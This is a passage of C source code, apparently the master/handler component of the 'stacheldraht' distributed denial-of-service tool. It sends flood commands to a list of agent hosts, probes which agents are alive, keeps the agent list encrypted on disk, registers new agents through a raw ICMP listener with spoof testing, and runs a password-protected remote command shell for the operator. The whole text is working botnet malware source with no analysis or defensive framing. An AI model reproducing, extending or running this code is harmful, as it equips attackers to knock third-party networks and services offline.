   *(int*)savi2=inet_addr(pointi);
  }
  floodcount++;
  savi2=savi2+4;
 }

 savi2=(char*)&sendit;
 tempi=htonl(ptimer);
 *(int*)savi2=tempi;
 memcpy(savi2+4,sendbuffer,500);
 sprintf(text,"%i floodrequests were sent to %i bcasts.\n",floodcount,bcastcount);
 ffprintf(text,fd);
 for (roundcounti=0;roundcounti<MAXROUNDS;roundcounti++) {
  for (count=0;count<bcastcount;count++) send_connect(bcasts[count],ID_SENDUDP,savi2,sizeof(sendbuffer));
 }
 /* set internal flood variable */
 flood=1;
}

void alrmsig()
{
 exit(0);
}

void mpingbcasts(int fd,int option)
{
 /* able to handle 1000 flood servers */
 int replies[1000];

 #define CONNECTED 1
 #define    NOTCON 0
 #define    FAILED 2

 #define SOCKTIMEOUT 5

 struct sockies {
  int socket;
  struct sockaddr_in connectstruct;
  char status;
  int timeout;
 };

 int there;
 int count2;
 int listensocket; 
 int received;
 int endtime;
 int MAXTIME=15;
 int alive;
 int dead;
 int albcasts;
 int rcount;
 int counti2;
 struct ippkt packet;
 fd_set fdset;
 struct timeval timi;
 int connectsocket;

 /* 1000 sockets are leet0 */
 struct sockies s[1000];
 /* 1000 structures are needed for connect */
 struct sockaddr_in connectstruct[1000];
 
 struct timeval tv;
 fd_set readset,writeset;
 int error;
 int laenge = sizeof(error);
 int lastsock;

 int result;
 int timeout;
 int oldflags;
 int failedcount;
 int remainder;
 int alreadydone;


 if (helpit) return;

 if (bcastcount==0) {
  if (option==3) {
   if (trinoo)  sprintf(prompti,"tR1n00(status: a!%i d!%i)>",0,0);
   else  sprintf(prompti,"stacheldraht(status: a!%i d!%i)>",0,0);
   return;
  }
 }


 if (option!=3) ffprintf("waiting for ping replies...\n",fd);

 memset((char*)&s,0,sizeof(s));
 memset((char*)&connectstruct,0,sizeof(connectstruct));
 memset(replies,0,sizeof(replies));



 alreadydone=0;
 count2=0;
 failedcount=0;
 remainder=0;

 while (alreadydone!=bcastcount) {
  alreadydone=alreadydone+remainder;
  remainder=bcastcount-alreadydone;
  if (remainder>250) remainder=250;

//  printf("%i\n",alreadydone);
  for (count=0;count<remainder;count++) {
   s[count].socket=socket(AF_INET,SOCK_STREAM,0);
   oldflags=fcntl(s[count].socket,F_GETFL,0);
   fcntl(s[count].socket,F_SETFL,O_NONBLOCK);
   s[count].status = NOTCON;
   s[count].connectstruct.sin_family=AF_INET;
   s[count].connectstruct.sin_port=htons(COMMANDPORT);
   s[count].connectstruct.sin_addr.s_addr=bcasts[count+alreadydone];
   error=connect(s[count].socket,(struct sockaddr*)&s[count].connectstruct,sizeof(s[count].connectstruct));
   s[count].timeout=time(NULL)+SOCKTIMEOUT;
   amanda.s_addr=bcasts[count+alreadydone];
  // printf("%s\n",inet_ntoa(amanda));

   if (error == -1 && errno != EINPROGRESS) {
    s[count].status=FAILED;
    close(s[count].socket);
    failedcount++;
   }else if (error == 0) {
     replies[count2++]=bcasts[count+alreadydone];
     s[count].status=CONNECTED;
     close(s[count].socket);
    }
   }

   timeout=time(NULL)+MAXTIME;
   while (timeout>time(NULL)) {
    tv.tv_sec = 2; 
    tv.tv_usec = 0;
    FD_ZERO(&readset);
    FD_ZERO(&writeset);
    lastsock = 0;
    if (failedcount+count2==remainder) break;
    for (count=0;count<remainder;count++) {
     if ((s[count].timeout < time(NULL)) && (s[count].status==NOTCON))
     {
      s[count].status=FAILED;
      failedcount++;
      close(s[count].socket);
     }
     if (s[count].status == NOTCON) {
      FD_SET(s[count].socket,&readset);
      FD_SET(s[count].socket,&writeset);
      lastsock = (lastsock > s[count].socket) ? lastsock :s[count].socket;
     }
    }

    if (select(lastsock+1,&readset,&writeset,NULL,&tv)!=0) {
     for (count=0;count<remainder;count++) {
      if (s[count].status==NOTCON) {
       if (FD_ISSET(s[count].socket,&readset) || FD_ISSET(s[count].socket,&writeset)) {
        if (FD_ISSET(s[count].socket, &readset) && FD_ISSET(s[count].socket,&writeset)) {
         if (getsockopt(s[count].socket,SOL_SOCKET,SO_ERROR,&error,&laenge)<0) {
          s[count].status=FAILED;
          close(s[count].socket);
          failedcount++;
         }
         if (error==0) {
          replies[count2++]=bcasts[count+alreadydone];
          s[count].status=CONNECTED; 
          close(s[count].socket);
         }
         else {
          s[count].status=FAILED;
          failedcount++;
          close(s[count].socket);
         }
        }  
       }
      }
     }
    }  
   }
  }

 printf("%i\n",count2); 


 count=0;
 while (replies[count]!=0) count++;
 albcasts=count;

 
 if (option==3) {
  if (trinoo)  sprintf(prompti,"tR1n00(status: a!%i d!%i)>",albcasts,(bcastcount-albcasts));
  else  sprintf(prompti,"stacheldraht(status: a!%i d!%i)>",albcasts,(bcastcount-albcasts));  
  return;
 }

 if ((option!=4) && (option!=5)) {
  sprintf(text,"total bcasts : %d   - 100%\n",bcastcount);
  ffprintf(text,fd);
  
  if (albcasts==0) sprintf(text,"alive bcasts : 0   - 0%\n");
  else sprintf(text,"alive bcasts : %d   -  %d%\n",albcasts,(albcasts*1000/(bcastcount*1000/100)));
  ffprintf(text,fd);
  sprintf(text,"dead bcasts  : %d   - %d%\n",(bcastcount-albcasts),((bcastcount-albcasts)*1000/(bcastcount*1000/100)));
  ffprintf(text,fd);
 }
 if (option==5) {
  ffprintf("showing the alive bcasts...\n",fd);
  ffprintf("---------------------------\n",fd);
  for (count2=0;count2<bcastcount;count2++) {
   there=0;
   count=0;
   while (replies[count]!=0) {
    if (bcasts[count2]==replies[count]) there=1;
    count++;
   }
   if (there==1) {
    amanda.s_addr=bcasts[count2];
    sprintf(text,"%s\n",inet_ntoa(amanda));
    ffprintf(text,fd);
   }
  }
  ffprintf("---------------------------\n",fd);
  sprintf(text,"alive bcasts: %i\n",albcasts);
  ffprintf(text,fd);
 }

 if (option==4) {
  ffprintf("showing the dead bcasts...\n",fd);
  ffprintf("--------------------------\n",fd);
  for (count2=0;count2<bcastcount;count2++) {
   there=0;
   count=0;
   while (replies[count]!=0) {
    if (bcasts[count2]==replies[count]) there=1;
    count++;
   }
   if (there==0) {
    amanda.s_addr=bcasts[count2];
    sprintf(text,"%s\n",inet_ntoa(amanda));
    ffprintf(text,fd);
   }
  }
  ffprintf("--------------------------\n",fd);
  sprintf(text,"dead bcasts: %i\n",bcastcount-albcasts);
  ffprintf(text,fd);
 }

 if (option==2) {
  ffprintf("sorting out all the dead bcasts\n",fd);
  ffprintf("-------------------------------\n",fd);
  for (count2=0;count2<bcastcount;count2++) {
   there=0;
   count=0; 
   while (replies[count]!=0) {
    if (bcasts[count2]==replies[count]) there=1;
    count++;
   }
   if (there==0) bcasts[count2]=666;
  }
  sprintf(text,"%d dead bcasts were sorted out.\n",(bcastcount-albcasts));
  
  writebcasts();
  ffprintf(text,fd);
  ffprintf("-------------------------------\n",fd);
 }
 close(listensocket);
}

void writebcasts() 
{
 FILE *fili;
 int killed;
 int count2;
 /* allocated memory for the bcasts */

 char *allocmem;
 char *savealloc;
 char muellbuffer[100000];
 char muellbuffer2[MAXBCASTS*4];
 char *encryptedmem;

 killed=0;
 count2=0;

 if ((fili=fopen(BCASTFILENAME,"w+"))!=NULL) {
  /* masterserver can handle bcasts up to MAXBCASTS */
  allocmem=malloc(100000);
  encryptedmem=malloc(100000);
  /* zero all entries */

  memset((void*)&tmpcasts,0,sizeof(tmpcasts)); 
  memset(allocmem,0,100000);
  memset(encryptedmem,0,100000);

  savealloc=allocmem;
  for (count=0;count<bcastcount;count++) {
   if (bcasts[count]!=666) {
    amanda.s_addr=bcasts[count];
    tmpcasts[count2]=bcasts[count];
    strcpy(savealloc,(char*)inet_ntoa(amanda));
    savealloc=savealloc+strlen(inet_ntoa(amanda));
    *savealloc=0x20;
    savealloc++;
    count2++;
   }
   else killed++;
  }
  /* calculate new amount of bcasts */
  if ((bcastcount==1) && (killed==1)) {
   bcastcount=0;
   memset((void*)&bcasts,0,sizeof(bcasts));
   fclose(fili);
   unlink(BCASTFILENAME);
   return;
  } 

  bcastcount=bcastcount-killed;
  memcpy((void*)&bcasts,(void*)&tmpcasts,bcastcount*4);

  strcpy(encryptedmem,encrypt_string(SALT,allocmem));
  fwrite(encryptedmem,strlen(encryptedmem),1,fili); 
  fclose(fili);
  free(allocmem);
  free(encryptedmem);
 }   
}


/* read all the bcasts into memory */
void readinbcasts() 
{
 FILE *fili;
 int temp; 
 long filesize;

 /* allocated memory for the bcasts */
 char *allocmem;
 int *savealloc;
 char *encryptedmem;
 char *decryptedmem;
 char *pointi;

 char scheissbuffer[100000];
 char scheissbuffer2[100000];

 char sicken[1000];
 char *sickpoint;

 bcastcount=0;
 if ((fili=fopen(BCASTFILENAME,"r"))!=0)
  {
  /* needed for the blowfish encryption of the bcasts */
  encryptedmem=(char*)&scheissbuffer;
  decryptedmem=(char*)&scheissbuffer2;

  fseek(fili,0,2);
  fgetpos(fili,&filesize);
  fseek(fili,0,0);

  fread(encryptedmem,filesize,1,fili);
  memset(decryptedmem,0,100000);
  memcpy(decryptedmem,decrypt_string(SALT,encryptedmem),filesize);
  count=0;
  bcastcount=0; 
  while (*decryptedmem!='\0') {
   sickpoint=(char*)&sicken;
   while (*decryptedmem!=' ') {
    *sickpoint++=*decryptedmem++;
   }
   *sickpoint='\0';
   decryptedmem++;
   bcasts[count]=inet_addr(sicken);
   bcastcount++;
   count++; 
  }
  fclose(fili);
 }
}

void main()
{
 int endtime;
 int tosend;
 int pid;
 int socki;
 int newsocket;
 int listensocket;
 int received;
 struct sockaddr_in socketmuell;
 int clientlength=sizeof(struct sockaddr_in);
 struct ippkt packet;
 FILE *fili;
 char trala[20];
 int nobcasts=1;
 int temp;
 int already; 
 char *crappointi;

 char decrypted[1024];
 char encrypted[1024];

 char *ficken;
 char *oldfick;

 signal (SIGHUP, SIG_IGN);
 signal (SIGTERM, SIG_IGN);
 signal (SIGCHLD, SIG_IGN);


 printf("[*]-stacheldraht-[*] - forking in the background...\n");

 readinbcasts();
 printf("%i bcasts were successfully read in.\n",bcastcount);
/* mpingbcasts(stdin,".mping");
 exit(0);  */


 pid=fork();
 if (pid==0)  {
 listensocket=socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);

 while (1) 
  {
   memset((void*)&packet,0,sizeof(struct ippkt));
   read(listensocket,(char*)&packet,sizeof(struct ippkt));
   tosend=0;
   readinbcasts();
   if (packet.ipi.ip_src.s_addr==inet_addr("3.3.3.3")) {
    send_connect(inet_addr(packet.buffer),SPOOF_REPLY,"spoofworks",10);
   }    

   if (ntohs(packet.icmpi.icmp_hun.ih_idseq.icd_id)==666) {
    amanda.s_addr=packet.ipi.ip_src.s_addr;
    strcpy((char*)&trala,(char*)inet_ntoa(amanda));
    send_connect(inet_addr(trala),667,"ficken",6);
    already=0;
    for (count=0;count<bcastcount;count++) {
     if (bcasts[count]==packet.ipi.ip_src.s_addr) already=1;
    } 


    if (already==0) {
     bcasts[count]=packet.ipi.ip_src.s_addr;
     bcastcount++;
     writebcasts();
     readinbcasts();
    } 
   } 
  }
 } 

 /* fork the listen routine */

 childcount=0;
 memset(pids,0,sizeof(pids));
 if (fork()==0) {
   readinbcasts();
   socki=socket(AF_INET,SOCK_STREAM,0);
   socketmuell.sin_port=htons(MSERVERPORT);
   socketmuell.sin_addr.s_addr=htonl(INADDR_ANY);
   socketmuell.sin_family=AF_INET;
   bind(socki,(struct sockaddr *)&socketmuell,sizeof(socketmuell));
   listen(socki,5);
  
   while (1) {
    newsocket=accept(socki,(struct sockaddr *)&socketmuell,&clientlength);
    /* fork a client */
    pid=fork();
    if (pid==0) {
     close(socki);
     publicfd=newsocket;

     memset(decrypted,0,sizeof(decrypted));
     read(newsocket,encrypted,sizeof(encrypted));
     
     decryptstuff(encrypted,decrypted,SALT);
     if (strcmp(decrypted,"authentication")) {
      strcpy(decrypted,"failed");
      write(newsocket,decrypted,sizeof(decrypted));
      close(newsocket);
      exit(0);
     } 
     pid=getpid();
     childcount=0;
     while (1) {
      if (pids[childcount]==0) {
       pids[childcount]=pid;
       break;
      }
      childcount++;
     }
     write(newsocket,encrypted,sizeof(encrypted)); 
     sleep(5);
     ffprintf("******************************\n",newsocket);
     ffprintf("   welcome to stacheldraht    \n",newsocket);
     ffprintf("******************************\n",newsocket);
     ffprintf("type .help if you are lame\n\n",newsocket); 
     setupfdroutine(newsocket);  
     exit(0);
    }
    childcount=0;    
    while (1) {
     if (pids[childcount]==0) {
      pids[childcount]=pid;
      break;
     }
     childcount++;
    }
    close(newsocket);
   } 
  }
}
